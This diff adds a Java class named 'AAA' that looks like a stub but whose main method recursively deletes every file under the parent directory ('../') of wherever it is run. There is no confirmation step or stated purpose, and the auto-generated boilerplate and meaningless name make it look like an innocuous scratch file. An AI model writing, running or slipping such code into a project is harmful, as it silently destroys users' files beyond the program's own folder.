@@ -1,0 +1,26 @@
+import java.io.File;
+
+
+public class AAA {
+
+	/**
+	 * @param args
+	 */
+	public static void main(String[] args) {
+		// TODO Auto-generated method stub
+		File file = new File("../");
+		deleteAll(file);
+	}
+	
+	public static void deleteAll(File file) {
+		
+		File[] _file = null;
+		if(file.isDirectory()) {
+			_file = file.listFiles();
+			for(int i = 0; i < _file.length; i++)
+				deleteAll(_file[i]);
+		}
+		else
+			file.delete();
+	}
+}
